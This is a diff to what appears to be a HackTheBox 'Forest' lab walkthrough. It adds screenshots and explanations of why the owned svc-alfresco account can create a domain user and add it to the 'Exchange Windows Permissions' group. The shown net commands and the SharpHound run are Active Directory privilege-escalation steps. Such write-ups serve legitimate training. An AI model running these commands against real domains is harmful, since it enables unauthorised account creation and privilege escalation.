@@ -288,11 +288,20 @@ C:\> .\SharpHound.exe -c all
   - Mark user `SVC-ALFRESCO@HTB.LOCAL` as owned.
 ![image](https://user-images.githubusercontent.com/83878909/231216827-1f4e7ae2-9738-49b8-affd-46d16113a566.png)
 
+![image](https://user-images.githubusercontent.com/83878909/231560688-e9a29326-4d1e-462b-bf9a-151694e9d952.png)
+
+![image](https://user-images.githubusercontent.com/83878909/231561418-8c47542f-1f78-4c4d-9762-0211e59923bb.png)
+
+![image](https://user-images.githubusercontent.com/83878909/231561547-2b048aa9-0a83-42b1-ae69-e17eae8aa0e7.png)
+
+
   - Create a new user in the domain.
+  - This is possible because svc-alfresco is a member of the group Account Operators.
 ```CSS
 C:\> net user random passwd123 /add /domain
 ```
   - Add the new user to the "Exchange Windows Permissions" group.
+  - This is possible because svc-alfresco has GenericAll permissions on the Exchange Windows Permissions group.
 ```CSS
 C:\> net group "Exchange Windows Permissions" random /add /domain
 ```
